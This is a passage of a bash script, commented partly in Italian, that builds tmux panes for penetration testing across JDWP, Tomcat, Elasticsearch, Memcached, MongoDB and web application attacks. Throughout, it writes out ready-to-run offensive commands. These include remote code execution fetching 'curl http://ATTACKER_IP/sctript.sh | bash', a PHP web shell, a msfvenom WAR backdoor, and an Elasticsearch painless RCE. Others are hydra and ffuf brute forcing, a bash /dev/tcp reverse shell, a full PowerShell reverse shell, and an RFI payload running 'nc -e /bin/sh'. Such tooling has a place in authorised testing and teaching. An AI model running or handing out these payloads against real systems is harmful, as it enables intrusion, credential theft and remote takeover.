tmux send-keys -t PT:34.0 "sudo python2 /opt/jdwp-shellifier/jdwp-shellifier.py -t $ip --break-on \"java.lang.String.indexOf\" –cmd \"curl -s http://ATTACKER_IP/sctript.sh | bash\""
tmux send-keys -t PT:34.1 "# JWDP: RCE - execute one command" Enter
tmux send-keys -t PT:34.1 "sudo python2 /opt/jdwp-shellifier/jdwp-shellifier.py -t $ip --break-on \"java.lang.String.indexOf\" --cmd \"ls -la\""
tmux send-keys -t PT:34.2 "# JWDP: RCE - Read file" Enter
tmux send-keys -t PT:34.2 "sudo python2 /opt/jdwp-shellifier/jdwp-shellifier.py -t $ip --break-on \"java.lang.String.indexOf\" --cmd \"cat /etc/passwd\""
tmux send-keys -t PT:34.3 "# JWDP: RCE - Write file" Enter
tmux send-keys -t PT:34.3 "sudo python2 /opt/jdwp-shellifier/jdwp-shellifier.py -t $ip --break-on \"java.lang.String.indexOf\" --cmd \"echo '<?php echo shell_exec($_GET[cmd]); ?>' > /var/www/html/shell.php\""
cd $folderProject

cd $folderProjectAuthN
# Tomcat
tmux new-window -t PT:35 -n '[8080, 8443] Tomcat'
tmux split-window -v -t PT:35.0
tmux split-window -v -t PT:35.1
tmux select-pane -t "35.1"
tmux split-window -h -t "35.1"
tmux split-window -h -t "35.1"
tmux split-window -h -t "35.1"
tmux split-window -h -t "35.1"
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:35.0 "# Tomcat: bruteforce" Enter
tmux send-keys -t PT:35.0 "hydra -L users.txt -P passwords.txt -s 8080 -f $ip http-get /manager/html && hydra -L users.txt -P users.txt -s 8080 -f $ip http-get /manager/html && hydra -l '' -p '' -s 8080 -f $ip http-get /manager/html && hydra -l 'dontknow' -p '' -s 8080 -f $ip http-get /manager/html"
tmux send-keys -t PT:35.1 "# Tomcat: Reverse Shell - create reverse shell" Enter
tmux send-keys -t PT:35.1 "msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=9001 -f war -o backdoor.war"
tmux send-keys -t PT:35.2 "# Tomcat: Reverse Shell - activate listener" Enter
tmux send-keys -t PT:35.2 "nc –nlvp 9001"
tmux send-keys -t PT:35.3 "# Tomcat: Reverse Shell - upload reverse shell" Enter
tmux send-keys -t PT:35.3 "curl -u 'USER:PASS' -X PUT -F \"file=@backdoor.war\" \"http://$ip:8080/manager/text/deploy?path=/backdoor\""
tmux send-keys -t PT:35.4 "# Tomcat: Reverse Shell - upload reverse shell by means of Application Manager. Refer to Cyber Security: guida pratica ai segreti dell’hacking etico nel 2025" Enter
tmux send-keys -t PT:35.5 "# Tomcat: Reverse Shell - activare reverse shell" Enter
tmux send-keys -t PT:35.5 "curl http://$ip:8080/backdoor/cfbrmtieqk.jsp"
cd $folderProject

cd $folderProjectAuthN
# Elasticsearch
tmux new-window -t PT:36 -n '[9200] Elasticsearch'
tmux split-window -v -t PT:36.0
tmux split-window -v -t PT:36.1
tmux select-pane -t "36.1"
tmux split-window -h -t "36.1"
tmux split-window -h -t "36.1"
tmux split-window -h -t "36.1"
tmux split-window -h -t "36.1"
tmux split-window -v -t PT:36.6
tmux select-pane -t "36.6"
tmux split-window -h -t "36.6"
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:36.0 "# Elasticsearch: bruteforce" Enter
tmux send-keys -t PT:36.0 "hydra -L users.txt -P passwords.txt -s 9200 $ip http-get "/_security/_authenticate" && hydra -L users.txt -P users.txt -s 9200 $ip http-get "/_security/_authenticate" && hydra -l "" -p "" -s 9200 $ip http-get "/_security/_authenticate" && hydra -l "dokntknow" -p "" -s 9200 $ip http-get "/_security/_authenticate""
tmux send-keys -t PT:36.1 "# Elasticsearch: Information Exposure - version number" Enter
tmux send-keys -t PT:36.1 "curl -XGET 'http://$ip:9200'"
tmux send-keys -t PT:36.2 "# Elasticsearch: Information Exposure - verify if authentication is active" Enter
tmux send-keys -t PT:36.2 "curl -XGET http://$ip:9200/_security/_authenticate"
tmux send-keys -t PT:36.3 "# Elasticsearch: Information Exposure - get info from nodes" Enter
tmux send-keys -t PT:36.3 "curl -XGET http://$ip:9200/_nodes"
tmux send-keys -t PT:36.4 "# Elasticsearch: Information Exposure - index enumeration" Enter
tmux send-keys -t PT:36.4 "curl http://$ip:9200/_cat/indices?v"
tmux send-keys -t PT:36.5 "# Elasticsearch: Information Exposure - get values related on a specific index" Enter
tmux send-keys -t PT:36.5 "curl –X POST http://$ip:9200/<index>/_search | jq ."
tmux send-keys -t PT:36.6 "# Elasticsearch: RCE - verify if scripting is active" Enter
tmux send-keys -t PT:36.6 "curl -u username:password -X POST \"http://$ip:9200/my_index/_search\" -H 'Content-Type: application/json' -d '{\"script_fields\":{\"test\":{\"script\":{\"source\":\"1 + 1\"}}}}'"
tmux send-keys -t PT:36.7 "# Elasticsearch: RCE execute id" Enter
tmux send-keys -t PT:36.7 "curl -X POST \"http://$ip:9200/_search\" -H \"Content-Type: application/json\" -d '{\"script_fields\":{\"rce\":{\"script\":{\"lang\":\"painless\",\"source\":\"java.lang.Runtime.getRuntime().exec(\"id\").text\"}}}}'"
cd $folderProject

cd $folderProjectAuthN
# Memchached
tmux new-window -t PT:37 -n '[11211] Memcached'
tmux split-window -v -t PT:37.0
tmux split-window -v -t PT:37.1
tmux select-pane -t "37.1"
tmux split-window -h -t "37.1"
tmux split-window -h -t "37.1"
tmux split-window -v -t PT:37.4
tmux select-pane -t "37.4"
tmux split-window -h -t "37.4"
tmux split-window -h -t "37.4"
tmux split-window -h -t "37.4"
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:37.0 "# Memchached: Service fingerprint" Enter
tmux send-keys -t PT:37.0 "nmap -p11211 --script=memcached-info $ip"
tmux send-keys -t PT:37.1 "# Memchached: Information Gathering Auto - statistics" Enter
tmux send-keys -t PT:37.1 "memcstat --servers=$ip"
tmux send-keys -t PT:37.2 "# Memchached: Information Gathering Auto - get all keys" Enter
tmux send-keys -t PT:37.2 "memcdump --servers=$ip"
tmux send-keys -t PT:37.3 "# Memchached: Information Gathering Auto - get values of specific keys" Enter
tmux send-keys -t PT:37.3 "memccat --servers=$ip KEY1 KEY2 KEY3"
tmux send-keys -t PT:37.4 "# Memchached: Information Gathering Manual - get Version" Enter
tmux send-keys -t PT:37.4 "echo \"version\" | nc -vn $ip 11211"
tmux send-keys -t PT:37.5 "# Memchached: Information Gathering Manual - get keys number of all the slubs" Enter
tmux send-keys -t PT:37.5 "echo \"stats items\" | nc -vn $ip 11211"
tmux send-keys -t PT:37.6 "# Memchached: Information Gathering Manual - get keys of a specific slub" Enter
tmux send-keys -t PT:37.6 "echo \"stats cachedump 1 0\" | nc -vn $ip 11211"
tmux send-keys -t PT:37.7 "# Memchached: Information Gathering Manual - get value of a specific key (e.g. usres" Enter
tmux send-keys -t PT:37.7 "echo \"get user\" | nc -vn $ip 11211 "
cd $folderProject

cd $folderProjectAuthN
# Mongodb
tmux new-window -t PT:38 -n '[27017] Mongodb'
tmux split-window -v -t PT:38.0
tmux split-window -v -t PT:38.1
tmux select-pane -t "38.1"
tmux split-window -h -t "38.1"
tmux split-window -h -t "38.1"
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:38.0 "# Mongodb: Service fingerprint" Enter
tmux send-keys -t PT:38.0 "nmap -vv -sV -Pn -p 27017 --script=mongodb-* $ip"
tmux send-keys -t PT:38.1 "printf \"\n# Get all database in mongodb \n test> show dbs\n# Select one database\n test> use pleaselikeandsub\n\n\" " Enter
tmux send-keys -t PT:38.1 "mongosh \"mongodb://USER:PASS@$ip:27017/dev?authSource=admin&w=1\""
tmux send-keys -t PT:38.2 "printf \"\n# Show all tables of a specific database\n pleaselikeandsub> show collections\n# - SELECT * FROM USERS \n pleaselikeandsub> db.users.find()\n# - SELECT * FROM USERS LIMIT 1 \n pleaselikeandsub> db.users.find().limit(1)\n# - SELECT * FROM USERS WHERE name='jeremy' \n pleaselikeandsub> db.users.find({name:'jeremy'})\n# - SELECT * FROM USERS WHERE name!='jeremy' \n pleaselikeandsub> db.users.find({name:{\"$ne\":'jeremy'}})\n\n\" " Enter
tmux send-keys -t PT:38.2 "mongosh \"mongodb://USER:PASS@$ip:27017/dev?authSource=admin&w=1\""
tmux send-keys -t PT:38.3 "printf \"\n# UPDATE products SET Title='Toilet dok72' WHERE ID= 638f116eeb060210cbd83a93'\n pleaselikandsub> db.products.updateOne({_id: ObjectId("638f116eeb060210cbd83a93")},{$set: {title:"Toilet dok72"}}) \n# INSERT\n pleaselikandsub> db.tasks.insert({"cmd" : "whoami"})\n# CREATE TABLE\n pleaselikeandsub> db.users.insertOne({"name":"jeremy"})\n\n\" " Enter
tmux send-keys -t PT:38.3 "mongosh \"mongodb://USER:PASS@$ip:27017/dev?authSource=admin&w=1\""
cd $folderProject

# Attivazione della modalità interattiva
tmux -2 attach-session -t PT
;;














        7)
######################
######################
###################### 	>>>>>>>>>>>>>>>>> WEB Service AuthN bypass: brute force, command injection, webDAV, etc
######################
######################
# XXX open_terminal "bash -c 'echo WEB APP: authN bypass; sleep 3;"
# Creazione di una sessione Tmux con attivazione VPN
tmux new-session -d -s PT -n "any other business"
tmux send-keys "ip=$ip" Enter
tmux send-keys "site=$site" Enter
tmux send-keys "domain=$domain" Enter
tmux send-keys "cd $folderProjectWebAuthN" Enter

# WEB User Enumeration
cd $folderProjectWebAuthN
# Layout
tmux new-window -t PT:1 -n 'WEB Attack credentials: User Enumeration'
tmux split-window -v -t PT:1.0
tmux select-pane -t "1.0"
tmux split-window -h -t "1.0"
tmux split-window -h -t "1.0"
tmux split-window -v -t PT:1.3
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:1.0 "# find users from predefined dictionaries" Enter
tmux send-keys -t PT:1.0 "find /usr/share/seclists/ | grep user | xargs wc -l | sort -n"
tmux send-keys -t PT:1.1 "# Extract users from web site (webDataExtractor)" Enter
tmux send-keys -t PT:1.1 "sudo python /opt/webDataExtractor/webDataExtractor.py $url 1"
tmux send-keys -t PT:1.2 "# Create username from Name (username-anarchy)" Enter
tmux send-keys -t PT:1.2 "sudo /opt/username-anarchy/username-anarchy <usernname>"
tmux send-keys -t PT:1.3 "# Verify if username is valid by means of login page or reset page" Enter
tmux send-keys -t PT:1.3 "ffuf -request BurpSavedLoginRequest.txt -fr \"Username is invalid\" -w users.txt:FUZZUSR,passwords.txt:FUZZPW"
cd $folderProject

# WEB Password Enumeration
cd $folderProjectWebAuthN
# Layout
tmux new-window -t PT:2 -n 'WEB Attack credentials: Password Enumeration'
tmux split-window -v -t PT:2.0
tmux resize-pane -t PT:2.0 -y 3
tmux select-pane -t "2.0"
tmux split-window -h -t "2.0"
tmux split-window -h -t "2.0"
tmux split-window -h -t "2.0"
tmux split-window -v -t PT:2.4
tmux select-pane -t "2.4"
tmux split-window -h -t "2.4"
tmux split-window -h -t "2.4"
tmux split-window -v -t PT:2.7
tmux select-pane -t "2.7"
tmux split-window -h -t "2.7"
tmux split-window -h -t "2.7"
tmux split-window -v -t PT:2.10
tmux select-pane -t "2.10"
tmux split-window -h -t "2.10"
tmux split-window -h -t "2.10"
tmux split-window -h -t "2.10"
tmux split-window -v -t PT:2.14
tmux select-pane -t "2.14"
tmux split-window -h -t "2.14"
tmux split-window -h -t "2.14"
tmux split-window -h -t "2.14"
tmux split-window -h -t "2.14"
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:2.0 "# WEB Password Enumeration: Create Dictionary - find dictionary from predefined dictionaries" Enter
tmux send-keys -t PT:2.0 "find /usr/share/seclists/ | grep pass | xargs wc -l | sort -n"
tmux send-keys -t PT:2.1 "# WEB Password Enumeration: Create Dictionary - I create all the combinations of the letters a,b,@ on 4 letter words" Enter
tmux send-keys -t PT:2.1 "crunch 4 4 ab@ -o pass.txt"
tmux send-keys -t PT:2.2 "# WEB Password Enumeration: Create Dictionary - I create a password that follows a template" Enter
tmux send-keys -t PT:2.2 "crunch 6 6 -t ,@@%%% -o pass.txt"
tmux send-keys -t PT:2.3 "# WEB Password Enumeration: Create Dictionary - I create a password that concatenates all the words indicated" Enter
tmux send-keys -t PT:2.3 "crunch 1 1 -o pass.txt -p  cat dog pig"
tmux send-keys -t PT:2.4 "# WEB Password Enumeration: Create Dictionary - Get words from site" Enter
tmux send-keys -t PT:2.4 "cewl $site -d 5 -m 6 -w ./cewl.out.txt --with-numbers"
tmux send-keys -t PT:2.5 "# WEB Password Enumeration: Create Dictionary - From User information to dictionary" Enter
tmux send-keys -t PT:2.5 "cupp -i"
tmux send-keys -t PT:2.6 "# WEB Password Enumeration: Create Dictionary - From some Word to dictionary" Enter
tmux send-keys -t PT:2.6 "wister -w mario rossi 25/12/1945 pietro rossi 25/12/2008  -c 1 2 3 4 5 -o wister.txt"
tmux send-keys -t PT:2.7 "# WEB Password Enumeration: Aggregate words of Dictionary - Combine two dictionaries" Enter
tmux send-keys -t PT:2.7 "/usr/share/hashcat-utils/combinator.bin words.txt digits.txt > dizio.txt"
tmux send-keys -t PT:2.8 "#  WEB Password Enumeration: Aggregate words of Dictionary - Combine three dictionaries" Enter
tmux send-keys -t PT:2.8 "/usr/share/hashcat-utils/combinator3.bin digits.txt words.txt digits.txt > dizio.txt"
tmux send-keys -t PT:2.9 "#  WEB Password Enumeration: Aggregate words of Dictionary - Combine dictionary and hashcat rules" Enter
tmux send-keys -t PT:2.9 "hashcat --stdout -a 6 words.list ?d?d"
tmux send-keys -t PT:2.10 "# WEB Password Enumeration: Operate on dictionaries - combine multiple dictionaries into one" Enter
tmux send-keys -t PT:2.10 "cat dizio1.txt dizio2.txt dizio3.txt | sort -u > dizionario_finale.txt"
tmux send-keys -t PT:2.11 "# WEB Password Enumeration: Operate on dictionaries - all words in lowercase" Enter
tmux send-keys -t PT:2.11 "awk '{print tolower($0)}' < passwordSite.txt > passwordSiteLower.txt"
tmux send-keys -t PT:2.12 "# WEB Password Enumeration: Operate on dictionaries - add suffix" Enter
tmux send-keys -t PT:2.12 "for i in \$(cat pwlist.txt); do echo $i; echo ${i}2019; echo ${i}2020; echo ${i}\!; done > newpwlist.txt"
tmux send-keys -t PT:2.13 "# WEB Password Enumeration: Operate on dictionaries - manipulate words with hashcat" Enter
tmux send-keys -t PT:2.13 "hashcat --force --stdout passwords.txt --stdout -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/toggles1.rule > newpasswords.txt | awk 'length($0) > 7' > newpasswords2.txt"
tmux send-keys -t PT:2.14 "# WEB Password Enumeration: dictionary passed on the fly - john create incremental dictionary" Enter
tmux send-keys -t PT:2.14 "john --stdout --incremental --session=sessioneSalvata | xargs -L 1  hydra -V -l guest ftp://$ip -p"
tmux send-keys -t PT:2.15 "# WEB Password Enumeration: dictionary passed on the fly - john restore session" Enter
tmux send-keys -t PT:2.15 "john --restore=sessioneSalvata | xargs -L 1  hydra -V -l guest ftp://$ip -p"
tmux send-keys -t PT:2.16 "# WEB Password Enumeration: dictionary passed on the fly - john pass one dictionary" Enter
tmux send-keys -t PT:2.16 "john -w=myDictionary.txt --session=sessioneSalvata --stdout | xargs -L 1  hydra -V -l usrguest ftp://$ip -p"
tmux send-keys -t PT:2.17 "# WEB Password Enumeration: dictionary passed on the fly - john pass multiple wordlists" Enter
tmux send-keys -t PT:2.17 "sudo find /usr/share/seclists/ | grep passw | grep .txt | grep -v Agent | xargs -t  -I% john --session=sessioneSalvata --wordlist=% --stdout | xargs -L 1  hydra -V -l usrguest ftp://$ip -p"
tmux send-keys -t PT:2.18 "# WEB Password Enumeration: dictionary passed on the fly - john pass multiple wordlists and applies its rule" Enter
tmux send-keys -t PT:2.18 "sudo find /usr/share/seclists/ | grep assword | grep .txt | grep -v Agent | xargs -t  -I% john --rules:single --session=attack1 --wordlist=% --stdout | xargs -L 1  hydra -V -l usrguest ftp://$ip -p"
cd $folderProject



# WEB Bruteforce AuthN
cd $folderProjectWebAuthN
# Layout
tmux new-window -t PT:3 -n 'WEB Attack credentials: Bruteforce AuthN'
tmux split-window -v -t PT:3.0
tmux select-pane -t "3.0"
tmux split-window -h -t "3.0"
tmux split-window -h -t "3.0"
tmux split-window -v -t PT:3.3
tmux select-pane -t "3.3"
tmux split-window -h -t "3.3"
tmux split-window -v -t PT:3.5
tmux select-pane -t "3.5"
tmux split-window -h -t "3.5"
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:3.0 "# WEB Bruteforce AuthN - POST with ffuf" Enter
tmux send-keys -t PT:3.0 "ffuf -request BurpSavedRequest.txt -request-proto http -w users.txt:FUZZUSR,passwords.txt:FUZZPW"
tmux send-keys -t PT:3.1 "# WEB Bruteforce AuthN - POST with wfuzz" Enter
tmux send-keys -t PT:3.1 "wfuzz -c -w names.txt -w passwords.txt -d \"username=FUZZ&password=FUZ2Z\" --hs \"No account found with that username\" http://$site/login.php"
tmux send-keys -t PT:3.2 "# WEB Bruteforce AuthN - POST with hydra" Enter
tmux send-keys -t PT:3.2 "hydra -L users.txt -P passwords.txt $site http-post-form \"/login.php:username=^USER^&password=^PASS^:F=No account found with that username\""
tmux send-keys -t PT:3.3 "# WEB Bruteforce AuthN - GET with wfuzz" Enter
tmux send-keys -t PT:3.3 "wfuzz -c -w users.txt -w passwords.txt -u \"http://$site/login.php?username=FUZZ&password=FUZ2Z\" --hc 403"
tmux send-keys -t PT:3.4 "# WEB Bruteforce AuthN - GET with hydra" Enter
tmux send-keys -t PT:3.4 "hydra -L users.txt -P passwords.txt $site http-get-form \"/login.php:username=^USER^&password=^PASS^:F=Invalid credentials\""
tmux send-keys -t PT:3.5 "# WEB Bruteforce AuthN - Basic Auth with hydra" Enter
tmux send-keys -t PT:3.5 "hydra -L users.txt -P passwords.txt $site http-get /"
tmux send-keys -t PT:3.6 "# WEB Bruteforce AuthN - Basic Auth with ffuf" Enter
tmux send-keys -t PT:3.6 "ffuf -w usernames.txt:W1 -w passwords.txt:W2 -u http://$site/protected/resource -H \"Authorization: Basic $(echo -n 'W1:W2' | base64)\" -fc 403"
cd $folderProject



# WEB Command Injection
cd $folderProjectWebAuthN
# Layout
tmux new-window -t PT:4 -n 'WEB Command Injection Auto'
tmux split-window -v -t PT:4.0
tmux resize-pane -t PT:4.0 -y 3
tmux split-window -v -t PT:4.1
tmux select-pane -t "4.1"
tmux split-window -h -t "4.1"
tmux split-window -h -t "4.1"
tmux split-window -v -t PT:4.4
tmux select-pane -t "4.4"
tmux split-window -h -t "4.4"
tmux split-window -h -t "4.4"
tmux split-window -v -t PT:4.7
tmux select-pane -t "4.7"
tmux split-window -h -t "4.7"
tmux split-window -h -t "4.7"
tmux split-window -v -t PT:4.10
tmux select-pane -t "4.10"
tmux split-window -h -t "4.10"
tmux split-window -h -t "4.10"
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:4.0 "# automate command injection scan" Enter
tmux send-keys -t PT:4.0 "sudo uniscan -u $url -qweds"
tmux send-keys -t PT:4.1 "# activate listener ICMP" Enter
tmux send-keys -t PT:4.1 "sudo tcpdump -i tun0 icmp"
tmux send-keys -t PT:4.2 "# activate listener HTTP" Enter
tmux send-keys -t PT:4.2 "python3 -m http.server 80"
tmux send-keys -t PT:4.3 "# activate listener SMB" Enter
tmux send-keys -t PT:4.3 "impacket-smbserver -smb2support htb \$(pwd)"
#Preparo il file per le command injection
cd $folderProjectEngine
#tmux send-keys -t PT:1.6 "echo \"eseguo da path $folderProjectEngine -> python ./cmdGenerator.py $attackerIP cmdList.txt \""
python ./cmdGenerator.py $attackerIP cmdlist.txt
mv "$folderProjectEngine/out-command-injection-list.txt" "$folderProjectWebAuthN/out-command-injection-list.txt"
cd $folderProjectWebAuthN
tmux send-keys -t PT:4.4"# command injection automation (save burp file with name: burp.req)" Enter
tmux send-keys -t PT:4.4 "ffuf -request burp.req -request-proto http -w $folderProjectWebAuthN/out-command-injection-list.txt -fl 120"
tmux send-keys -t PT:4.5"# command injection automation (GET)" Enter
tmux send-keys -t PT:4.5 "wfuzz -c -z file,out-command-injection-list.txt -H \"Content-Type: application/x-www-form-urlencoded\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\" --sc=200 $url/?id=FUZZ"
tmux send-keys -t PT:4.6 "# command injection automation (POST)" Enter
tmux send-keys -t PT:4.6 "wfuzz -c -z file,out-command-injection-list.txt -H \"Content-Type: application/x-www-form-urlencoded\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\" -d \"username=admin&password=FUZZ\" --sc=200 $url/login.php # cmd injection (POST)"
tmux send-keys -t PT:4.7"# command injection automation for Linux: save revShell for linux in shell file" Enter
tmux send-keys -t PT:4.7 "echo \"/bin/bash -i >& /dev/tcp/<ATTACKER_IP>/9001 0>&1\" > shell"
tmux send-keys -t PT:4.8"# command injection automation for Linux: activate HTTP server" Enter
tmux send-keys -t PT:4.8 "python3 -m http.server 80"
tmux send-keys -t PT:4.9"# command injection automation for Linux: listener" Enter
tmux send-keys -t PT:4.9 "nc -nlvp 9001"
tmux send-keys -t PT:4.10"# command injection automation for Windows: save revShell for windows in shellWin file" Enter
tmux send-keys -t PT:4.10 'echo '\''$LHOST = "192.168.1.102"; $LPORT = 9001; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()'\'' > shellWin' C-m
tmux send-keys -t PT:4.11"# command injection automation for Windows: activate HTTP server" Enter
tmux send-keys -t PT:4.11 "python3 -m http.server 80"
tmux send-keys -t PT:4.12 "# command injection automation for Windows: listener" Enter
tmux send-keys -t PT:4.12 "nc -nlvp 9001"
cd $folderProject


# LFI
cd $folderProjectWebAuthN
# Layout
tmux new-window -t PT:5 -n 'LFI'
tmux split-window -v -t PT:5.0
tmux select-pane -t "5.0"
tmux split-window -h -t "5.0"
tmux split-window -h -t "5.0"
tmux split-window -v -t PT:5.3
tmux split-window -v -t PT:5.4
tmux select-pane -t "5.4"
tmux split-window -h -t "5.4"
tmux split-window -v -t PT:5.6
# Esecuzione dei comandi nelle sottofinestre
#Preparo il file per le command injection
cd $folderProjectEngine
python ./injectionGenerator.py $attackerIP injectionlist.txt
mv "$folderProjectEngine/out-injection-list.txt" "$folderProjectWebAuthN/out-injection-list.txt"
cd $folderProjectWebAuthN
tmux send-keys -t PT:5.0"# LFI injection automation (save burp file with name: burp.req)" Enter
tmux send-keys -t PT:5.0 "ffuf -request burp.req -request-proto http -w $folderProjectWebAuthN/out-injection-list.txt -fl 120"
tmux send-keys -t PT:5.1"# LFI injection automation (GET)" Enter
tmux send-keys -t PT:5.1 "wfuzz -c -z file,out-injection-list.txt -H \"Content-Type: application/x-www-form-urlencoded\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\" --sc=200 $url/?id=FUZZ"
tmux send-keys -t PT:5.2 "# LFI injection automation (POST)" Enter
tmux send-keys -t PT:5.2 "wfuzz -c -z file,out-injection-list.txt -H \"Content-Type: application/x-www-form-urlencoded\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\" -d \"username=admin&password=FUZZ\" --sc=200 $url/login.php # cmd injection (POST)"
tmux send-keys -t PT:5.3 "# LFI: read file" Enter
tmux send-keys -t PT:5.3 "sudo python3 /opt/LFIxplorer/LFIxplorer.py burp.req"
tmux send-keys -t PT:5.4 "# LFI: port scanner - file with ports number" Enter
tmux send-keys -t PT:5.4 "sudo rm -f $folderProjectWebAuthN/numbers.txt && for i in {1..65535}; do echo $i; done > numbers.txt"
tmux send-keys -t PT:5.5 "# LFI: port scanner start" Enter
tmux send-keys -t PT:5.5 "ffuf -request GET-burp-example.req -request-proto http -w numbers.txt:FUZZ -fl 92"
tmux send-keys -t PT:5.6 "printf \"\nIf it is possible to read these files, it could be possibile to get a RCE:\nc:/inetpub/logs/LogFiles/W3SVC1/u_ex<aaMMgg>.log \n\n/proc/self/environ \n/proc/self/fd/0 \n/proc/self/fd/1 \n... \n/proc/self/fd/5\n\n/var/log/apache2/access.log \n/var/log/httpd/access.log \n/var/log/nginx/access.log \n\n/var/spool/micheal \n/var/log/mail \n/var/email/asterix \n\n/var/log/auth.log \n \" " Enter
cd $folderProject


# RFI
cd $folderProjectWebAuthN
# Layout
tmux new-window -t PT:6 -n 'RFI'
tmux split-window -v -t PT:6.0
tmux select-pane -t "6.0"
tmux split-window -h -t "6.0"
tmux split-window -h -t "6.0"
tmux split-window -v -t PT:6.3
tmux select-pane -t "6.3"
tmux split-window -h -t "6.3"
tmux split-window -h -t "6.3"
tmux split-window -v -t PT:6.6
tmux select-pane -t "6.6"
tmux split-window -h -t "6.6"
tmux split-window -h -t "6.6"
tmux split-window -h -t "6.6"
tmux split-window -h -t "6.6"
tmux split-window -h -t "6.6"
tmux split-window -h -t "6.6"
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:6.0"# RFI - HTTP listener" Enter
tmux send-keys -t PT:6.0 "python3 -m http.server 80"
tmux send-keys -t PT:6.1"# RFI - interacsh listener" Enter
tmux send-keys -t PT:6.1 "firefox https://app.interactsh.com/ &"
tmux send-keys -t PT:6.2"# RFI - SMB listener" Enter
tmux send-keys -t PT:6.2 "impacket-smbserver -smb2support share $(pwd)"
#Preparo il file per le RFI injection
cd $folderProjectEngine
python ./injectionGenerator.py $attackerIP injectionlist.txt
mv "$folderProjectEngine/out-injection-list.txt" "$folderProjectWebAuthN/out-injection-list.txt"
cd $folderProjectWebAuthN
tmux send-keys -t PT:6.3"# RFI injection automation (save burp file with name: burp.req)" Enter
tmux send-keys -t PT:6.3 "ffuf -request burp.req -request-proto http -w $folderProjectWebAuthN/out-injection-list.txt -fl 120"
tmux send-keys -t PT:6.4"# RFI injection automation (GET)" Enter
tmux send-keys -t PT:6.4 "wfuzz -c -z file,out-injection-list.txt -H \"Content-Type: application/x-www-form-urlencoded\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\" --sc=200 $url/?id=FUZZ"
tmux send-keys -t PT:6.5 "# RFI injection automation (POST)" Enter
tmux send-keys -t PT:6.5 "wfuzz -c -z file,out-injection-list.txt -H \"Content-Type: application/x-www-form-urlencoded\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\" -d \"username=admin&password=FUZZ\" --sc=200 $url/login.php # cmd injection (POST)"
cd $folderProject
tmux send-keys -t PT:6.6"# RFI - activate listener on 9001 port " Enter
tmux send-keys -t PT:6.6 "nc -nlvp 9001"
tmux send-keys -t PT:6.7"# RFI - prepare a reverse shell on PHP page" Enter
tmux send-keys -t PT:6.7 "rm -f shell.txt && echo \"<?php passthru(\\\"nc -e /bin/sh ATTACKER_IP 9001\\\"); ?>\" > shell.txt && python3 -m http.server 80"
tmux send-keys -t PT:6.8"# RFI - activate reverse shell" Enter
tmux send-keys -t PT:6.8 "firefox http://$site/page-RFI.php?file=http://ATTACKER_IP/shell.txt &"
tmux send-keys -t PT:6.9"# RFI - activate reverse shell" Enter
tmux send-keys -t PT:6.9 "firefox http://$site/page-RFI.php?file=http://ATTACKER_IP/shell.txt? &"
tmux send-keys -t PT:6.10"# RFI - activate reverse shell" Enter
tmux send-keys -t PT:6.10 "firefox http://$site/page-RFI.php?file=ftp://ATTACKER_IP/shell.txt &"
tmux send-keys -t PT:6.11"# RFI - activate reverse shell" Enter
tmux send-keys -t PT:6.11 "firefox http://$site/page-RFI.php?file=hTTp://ATTACKER_IP/shell.txt &"


# SSRF
cd $folderProjectWebAuthN
# Layout
tmux new-window -t PT:7 -n 'SSRF'
tmux split-window -v -t PT:7.0
tmux select-pane -t "7.0"
tmux split-window -h -t "7.0"
tmux split-window -v -t PT:7.2
tmux select-pane -t "7.2"
tmux split-window -h -t "7.2"
tmux split-window -h -t "7.2"
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:7.0"# SSRF - HTTP listener" Enter
tmux send-keys -t PT:7.0 "python3 -m http.server 80"
tmux send-keys -t PT:7.1"# SSRF - interacsh listener" Enter
tmux send-keys -t PT:7.1 "firefox https://app.interactsh.com/ &"
#Preparo il file per le SSRF injection
cd $folderProjectEngine
python ./injectionGenerator.py $attackerIP injectionlist.txt
mv "$folderProjectEngine/out-injection-list.txt" "$folderProjectWebAuthN/out-injection-list.txt"
cd $folderProjectWebAuthN
tmux send-keys -t PT:7.2"# RFI injection automation (save burp file with name: burp.req)" Enter
tmux send-keys -t PT:7.2 "ffuf -request burp.req -request-proto http -w $folderProjectWebAuthN/out-injection-list.txt -fl 120"
